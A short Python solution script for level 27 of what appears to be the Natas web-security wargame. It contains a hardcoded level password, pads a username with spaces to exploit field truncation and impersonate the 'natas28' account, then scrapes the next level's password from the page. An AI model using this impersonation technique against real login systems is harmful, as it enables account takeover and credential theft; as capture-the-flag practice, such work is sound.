# -*- coding: utf-8 -*-
from base import get_page, post_page
import re
import requests

def natas27():
    username="natas27"
    password = "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"

    data = {"username":"natas28"+" "*57+"lol", "password":"lol"}
    post_page(27, username, password, data=data)
    data = {"username":"natas28", "password":"lol"}
    content = post_page(27, username, password, data=data)
    password = re.search(r"(?<=&gt; )\w{32}", content)
    if password is None:
        print("Fail to find password")
        return
    print(password.group(0))

if __name__ == "__main__":
    natas27()